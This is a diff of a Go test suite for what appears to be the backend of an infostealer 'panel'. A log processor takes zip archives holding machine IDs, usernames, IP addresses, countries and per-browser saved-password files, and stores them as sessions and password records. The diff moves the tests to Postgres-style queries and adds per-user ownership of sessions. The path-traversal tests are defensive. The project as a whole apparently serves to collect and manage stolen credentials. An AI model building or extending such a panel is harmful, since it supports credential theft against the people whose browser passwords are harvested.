@@ -4,32 +4,15 @@ import (
 	"archive/zip"
 	"bytes"
 	"database/sql"
-	"os"
 	"strings"
 	"testing"
 
 	"github.com/google/uuid"
-	"zialfi-panel/internal/db"
 	"zialfi-panel/internal/services"
+	"zialfi-panel/internal/testutil"
 )
 
-func openTestDB(t *testing.T) *sql.DB {
-	t.Helper()
-	f, err := os.CreateTemp(t.TempDir(), "mirage-test-*.db")
-	if err != nil {
-		t.Fatal(err)
-	}
-	f.Close()
-	d, err := db.OpenDB(f.Name())
-	if err != nil {
-		t.Fatal(err)
-	}
-	if err := db.RunMigrations(d, db.MigrationsFS); err != nil {
-		t.Fatal(err)
-	}
-	t.Cleanup(func() { d.Close() })
-	return d
-}
+func openTestDB(t *testing.T) *sql.DB { return testutil.OpenTestDB(t) }
 
 func createTestZip(t *testing.T, files map[string]string) []byte {
 	t.Helper()
@@ -58,7 +41,7 @@ func TestProcess_ValidZip(t *testing.T) {
 	})
 
 	metadata := `{"hwid":"hw-001","os":"win10","username":"alice","ip":"1.2.3.4","country":"US"}`
-	sessionID, err := processor.Process(archive, metadata)
+	sessionID, err := processor.Process(archive, metadata, "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -67,18 +50,18 @@ func TestProcess_ValidZip(t *testing.T) {
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 session, got %d", count)
 	}
 
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 2 {
 		t.Errorf("expected 2 passwords, got %d", count)
 	}
 
 	var hwid, os, username, ip, country string
-	d.QueryRow("SELECT hwid, os, username, ip, country_code FROM sessions WHERE id=?", sessionID).Scan(&hwid, &os, &username, &ip, &country)
+	d.QueryRow("SELECT hwid, os, username, ip, country_code FROM sessions WHERE id=$1", sessionID).Scan(&hwid, &os, &username, &ip, &country)
 	if hwid != "hw-001" {
 		t.Errorf("hwid = %q, want hw-001", hwid)
 	}
@@ -110,7 +93,7 @@ func TestProcess_PathTraversal(t *testing.T) {
 		"../../etc/passwd": "root:x:0:0:root:/root:/bin/bash",
 	})
 
-	sessionID, err := processor.Process(archive, "")
+	sessionID, err := processor.Process(archive, "", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -119,7 +102,7 @@ func TestProcess_PathTraversal(t *testing.T) {
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected session created, got %d", count)
 	}
@@ -133,7 +116,7 @@ func TestProcess_AbsolutePath(t *testing.T) {
 		"/etc/passwd": "root:x:0:0:root:/root:/bin/bash",
 	})
 
-	_, err := processor.Process(archive, "")
+	_, err := processor.Process(archive, "", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -150,13 +133,13 @@ func TestProcess_EmptyZip(t *testing.T) {
 	processor := services.NewLogProcessor(d, nil)
 
 	archive := createTestZip(t, map[string]string{})
-	sessionID, err := processor.Process(archive, "{}")
+	sessionID, err := processor.Process(archive, "{}", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 session, got %d", count)
 	}
@@ -176,19 +159,19 @@ func TestProcess_MalformedMetadata(t *testing.T) {
 		"passwords.txt": "https://x.com\tu\tp",
 	})
 
-	sessionID, err := processor.Process(archive, "{not valid json!!!")
+	sessionID, err := processor.Process(archive, "{not valid json!!!", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM sessions WHERE id=$1", sessionID).Scan(&count)
 	if count != 1 {
 		t.Errorf("expected 1 session, got %d", count)
 	}
 
 	var passwords int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&passwords)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&passwords)
 	if passwords != 1 {
 		t.Errorf("expected 1 password, got %d", passwords)
 	}
@@ -203,19 +186,19 @@ func TestProcess_MultipleBrowsers(t *testing.T) {
 		"Browser Data/Firefox_passwords.txt": "https://b.com\tu2\tp2",
 	})
 
-	sessionID, err := processor.Process(archive, "{}")
+	sessionID, err := processor.Process(archive, "{}", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 2 {
 		t.Errorf("expected 2 passwords, got %d", count)
 	}
 
 	var browsers []string
-	rows, err := d.Query("SELECT browser FROM passwords WHERE session_id=? ORDER BY url", sessionID)
+	rows, err := d.Query("SELECT browser FROM passwords WHERE session_id=$1 ORDER BY url", sessionID)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -249,13 +232,13 @@ func TestProcess_MultiplePasswordLines(t *testing.T) {
 		"passwords.txt": strings.Join(lines, "\n"),
 	})
 
-	sessionID, err := processor.Process(archive, "{}")
+	sessionID, err := processor.Process(archive, "{}", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 10 {
 		t.Errorf("expected 10 passwords, got %d", count)
 	}
@@ -270,14 +253,37 @@ func TestProcess_MalformedLine(t *testing.T) {
 		"passwords.txt": content,
 	})
 
-	sessionID, err := processor.Process(archive, "{}")
+	sessionID, err := processor.Process(archive, "{}", "test-user-id")
 	if err != nil {
 		t.Fatal(err)
 	}
 
 	var count int
-	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=?", sessionID).Scan(&count)
+	d.QueryRow("SELECT COUNT(*) FROM passwords WHERE session_id=$1", sessionID).Scan(&count)
 	if count != 2 {
 		t.Errorf("expected 2 passwords (malformed line skipped), got %d", count)
+	}
+}
+
+func TestProcess_SetsOwnerID(t *testing.T) {
+	d := openTestDB(t)
+	processor := services.NewLogProcessor(d, nil)
+
+	archive := createTestZip(t, map[string]string{
+		"passwords.txt": "https://example.com\tuser\tpass",
+	})
+
+	sessionID, err := processor.Process(archive, "{}", "user-123")
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	var ownerID string
+	err = d.QueryRow("SELECT COALESCE(owner_id, '') FROM sessions WHERE id = $1", sessionID).Scan(&ownerID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if ownerID != "user-123" {
+		t.Errorf("owner_id = %q, want user-123", ownerID)
 	}
 }
